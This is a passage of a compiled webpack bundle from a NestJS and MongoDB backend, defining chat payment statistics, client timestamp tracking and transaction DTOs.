exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats2/stat2.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/stat2.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Controller = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
const update_stat2_dto_1 = __webpack_require__(/*! ./update-stat2.dto */ "./src/components/stats2/update-stat2.dto.ts");
let Stat2Controller = class Stat2Controller {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.Stat2Controller = Stat2Controller;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat2_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat2_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteAll", null);
exports.Stat2Controller = Stat2Controller = __decorate([
    (0, swagger_1.ApiTags)('stats2'),
    (0, common_1.Controller)('stats2'),
    __metadata("design:paramtypes", [stat2_service_1.Stat2Service])
], Stat2Controller);


/***/ }),

/***/ "./src/components/stats2/stat2.module.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Module = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const stat2_controller_1 = __webpack_require__(/*! ./stat2.controller */ "./src/components/stats2/stat2.controller.ts");
const stat2_schema_1 = __webpack_require__(/*! ./stat2.schema */ "./src/components/stats2/stat2.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let Stat2Module = class Stat2Module {
};
exports.Stat2Module = Stat2Module;
exports.Stat2Module = Stat2Module = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "Stats2Module", collection: "stats2", schema: stat2_schema_1.StatSchema }])
        ],
        controllers: [stat2_controller_1.Stat2Controller],
        providers: [stat2_service_1.Stat2Service],
        exports: [stat2_service_1.Stat2Service]
    })
], Stat2Module);


/***/ }),

/***/ "./src/components/stats2/stat2.schema.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.schema.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat2 = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat2 = class Stat2 {
};
exports.Stat2 = Stat2;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "profile", void 0);
exports.Stat2 = Stat2 = __decorate([
    (0, mongoose_1.Schema)()
], Stat2);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat2);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats2/stat2.service.ts":
/*!************************************************!*\
  !*** ./src/components/stats2/stat2.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Service = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let Stat2Service = class Stat2Service {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.Stat2Service = Stat2Service;
exports.Stat2Service = Stat2Service = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("Stats2Module")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], Stat2Service);


/***/ }),

/***/ "./src/components/stats2/update-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/update-stat2.dto.ts ***!
  \***************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat2_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/timestamps/timestamp.controller.ts":
/*!***********************************************************!*\
  !*** ./src/components/timestamps/timestamp.controller.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
let TimestampController = class TimestampController {
    constructor(timestampService) {
        this.timestampService = timestampService;
    }
    async findOne() {
        return this.timestampService.findOne();
    }
    async getClientsWithTimeDifference(thresholdMinutes) {
        const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;
        return this.timestampService.getClientsWithTimeDifference(threshold);
    }
    async update(updateTimestampDto) {
        return this.timestampService.update(updateTimestampDto);
    }
};
exports.TimestampController = TimestampController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get timestamp data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('stalled'),
    (0, swagger_1.ApiOperation)({ summary: 'Get clients with time differences greater than threshold' }),
    (0, swagger_1.ApiQuery)({
        name: 'threshold',
        type: Number,
        required: false,
        description: 'Minimum time difference in minutes (default: 3)'
    }),
    __param(0, (0, common_1.Query)('threshold')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "getClientsWithTimeDifference", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update timestamp data' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "update", null);
exports.TimestampController = TimestampController = __decorate([
    (0, swagger_1.ApiTags)('Timestamps'),
    (0, common_1.Controller)('timestamps'),
    __metadata("design:paramtypes", [timestamp_service_1.TimestampService])
], TimestampController);


/***/ }),

/***/ "./src/components/timestamps/timestamp.module.ts":
/*!*******************************************************!*\
  !*** ./src/components/timestamps/timestamp.module.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
const timestamp_controller_1 = __webpack_require__(/*! ./timestamp.controller */ "./src/components/timestamps/timestamp.controller.ts");
const timestamps_schema_1 = __webpack_require__(/*! ./timestamps.schema */ "./src/components/timestamps/timestamps.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TimestampModule = class TimestampModule {
};
exports.TimestampModule = TimestampModule;
exports.TimestampModule = TimestampModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{
                    name: 'timestampModule',
                    collection: 'timestamps',
                    schema: timestamps_schema_1.TimestampSchema
                }]),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
        ],
        providers: [timestamp_service_1.TimestampService],
        controllers: [timestamp_controller_1.TimestampController],
        exports: [timestamp_service_1.TimestampService],
    })
], TimestampModule);


/***/ }),

/***/ "./src/components/timestamps/timestamp.service.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamp.service.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let TimestampService = class TimestampService {
    constructor(timestampModel, clientService) {
        this.timestampModel = timestampModel;
        this.clientService = clientService;
    }
    async findOne() {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (timestamp._id) {
            delete timestamp._id;
        }
        return timestamp;
    }
    async getTimeDifferences(threshold = 3 * 60 * 1000) {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        const currentTime = Date.now();
        const differences = {};
        Object.keys(timestamp).forEach(key => {
            if (key === '_id' || typeof timestamp[key] !== 'number') {
                return;
            }
            const difference = currentTime - timestamp[key];
            if (difference > threshold) {
                differences[key] = difference;
            }
        });
        return differences;
    }
    async getClientsWithTimeDifference(threshold = 3 * 60 * 1000) {
        const differences = await this.getTimeDifferences(threshold);
        const clientIds = Object.keys(differences);
        if (clientIds.length === 0) {
            return [];
        }
        const urls = [];
        for (const clientId of clientIds) {
            const clientParams = clientId.split('_');
            try {
                const client = await this.clientService.findOne(clientParams[0], false);
                if (client) {
                    if (clientParams[1]) {
                        urls.push(client.promoteRepl);
                    }
                    else {
                        urls.push(client.repl);
                    }
                }
            }
            catch (error) {
                console.error(`Error fetching client with ID ${clientId}:`, error.message);
            }
        }
        return urls;
    }
    async update(updateTimestampDto) {
        delete updateTimestampDto['_id'];
        const updatedTimestamp = await this.timestampModel.findOneAndUpdate({}, { $set: { ...updateTimestampDto } }, { new: true, upsert: true, lean: true }).exec();
        if (!updatedTimestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (updatedTimestamp._id) {
            delete updatedTimestamp._id;
        }
        return updatedTimestamp;
    }
};
exports.TimestampService = TimestampService;
exports.TimestampService = TimestampService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('timestampModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], TimestampService);


/***/ }),

/***/ "./src/components/timestamps/timestamps.schema.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamps.schema.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampSchema = exports.Timestamp = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Timestamp = class Timestamp {
};
exports.Timestamp = Timestamp;
exports.Timestamp = Timestamp = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        strict: false,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Timestamp);
exports.TimestampSchema = mongoose_1.SchemaFactory.createForClass(Timestamp);
exports.TimestampSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/transactions/dto/create-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/create-transaction.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateTransactionDto = exports.TransactionStatus = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var TransactionStatus;
(function (TransactionStatus) {
    TransactionStatus["PENDING"] = "pending";
    TransactionStatus["COMPLETED"] = "completed";
    TransactionStatus["FAILED"] = "failed";
    TransactionStatus["CANCELLED"] = "cancelled";
})(TransactionStatus || (exports.TransactionStatus = TransactionStatus = {}));
class CreateTransactionDto {
    constructor() {
        this.profile = "undefined";
        this.chatId = "undefined";
        this.ip = "undefined";
        this.status = TransactionStatus.PENDING;
    }
}
exports.CreateTransactionDto = CreateTransactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique transaction ID (UTR)',
        example: 'TXN123456789',
        minLength: 8
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.MinLength)(8),
    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? value.toLowerCase() : value),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Amount involved in the transaction',
        example: 100.50,
        minimum: 0
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_transformer_1.Transform)(({ value }) => parseFloat(value)),
    __metadata("design:type", Number)
], CreateTransactionDto.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Issue type reported by the user',
        example: 'payment_failed'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of issue reported by the user',
        example: 'Payment failed due to network error'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Refund method selected by the user',
        example: 'bank_transfer',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User profile ID',
        example: 'user123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User chat ID',
        example: 'chat123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'IP address of the user',
        example: '192.168.1.1',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Transaction status',
        enum: TransactionStatus,
        default: TransactionStatus.PENDING,
        required: false
    }),
    (0, class_validator_1.IsEnum)(TransactionStatus),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "status", void 0);


/***/ }),

/***/ "./src/components/transactions/dto/update-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/update-transaction.dto.ts ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateTransactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
